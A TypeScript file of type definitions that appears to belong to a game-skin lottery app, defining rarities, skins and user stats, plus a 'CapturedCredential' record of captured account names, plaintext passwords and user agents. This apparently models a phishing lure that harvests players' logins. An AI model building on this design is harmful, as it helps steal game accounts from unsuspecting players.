
export enum Rarity {
  MYTHIC = '红色品质',
  LEGENDARY = '粉色品质',
  EPIC = '紫色品质',
  RARE = '蓝色品质'
}

export interface Skin {
  id: string;
  name: string;
  category: '载具' | '枪械' | '套装' | '降落伞';
  rarity: Rarity;
  imageUrl: string;
  value: number;
}

export interface CapturedCredential {
  account: string;
  pass: string;
  timestamp: number;
  id: string; // Unique ID for each entry
  userAgent: string; // To simulate device tracking
}

export interface UserStats {
  coins: number;
  totalDraws: number;
  collection: Skin[];
  credentials: CapturedCredential[];
  history: {
    timestamp: number;
    skinId: string;
  }[];
}

export interface AppraisalResponse {
  commentary: string;
  luckScore: number;
  tacticalAdvice: string;
}
